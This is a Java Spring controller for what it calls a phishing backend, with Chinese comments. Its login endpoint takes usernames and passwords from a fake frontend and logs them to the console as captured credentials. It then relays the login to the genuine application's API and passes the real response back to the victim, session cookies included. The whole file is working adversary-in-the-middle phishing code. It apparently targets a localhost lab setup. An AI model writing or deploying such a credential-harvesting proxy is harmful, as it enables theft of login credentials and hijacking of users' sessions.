package com.example.phishingbackend.controller;

import com.example.phishingbackend.dto.LoginRequest;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.RestTemplate;

@RestController
@RequestMapping("/api")
// 允许来自钓鱼前端的请求
@CrossOrigin(origins = "http://localhost:8081", allowCredentials = "true")
public class PhishingController {

    @Autowired
    private RestTemplate restTemplate;

    // 正版应用的 API 地址
    private final String legitApiUrl = "http://localhost:9090/api/login";

    @PostMapping("/login")
    public ResponseEntity<String> phishingLogin(@RequestBody LoginRequest loginRequest) {
        // 1. 【记录】 这是钓鱼攻击的关键步骤！
        System.out.println("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
        System.out.println("!!!         钓鱼成功 - 捕获到凭证         !!!");
        System.out.println("!!! Username: " + loginRequest.getUsername());
        System.out.println("!!! Password: " + loginRequest.getPassword());
        System.out.println("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");

        try {
            // 2. 【转发】将请求原封不动地转发到正版后端
            HttpHeaders headers = new HttpHeaders();
            headers.add("Content-Type", "application/json");

            HttpEntity<LoginRequest> requestEntity = new HttpEntity<>(loginRequest, headers);

            ResponseEntity<String> responseEntity = restTemplate.exchange(
                    legitApiUrl,
                    HttpMethod.POST,
                    requestEntity,
                    String.class // 直接获取原始响应体
            );
            
            // 3. 【响应】将正版后端的完整响应（包括 header 和 body）转发给用户
            return ResponseEntity
                    .status(responseEntity.getStatusCode())
                    .headers(responseEntity.getHeaders()) // 转发所有header，包括 Set-Cookie
                    .body(responseEntity.getBody());

        } catch (HttpClientErrorException e) {
            // 如果正版后端返回错误（如401 Unauthorized），也将其转发给用户
            return ResponseEntity
                    .status(e.getStatusCode())
                    .headers(e.getResponseHeaders())
                    .body(e.getResponseBodyAsString());
        }
    }
}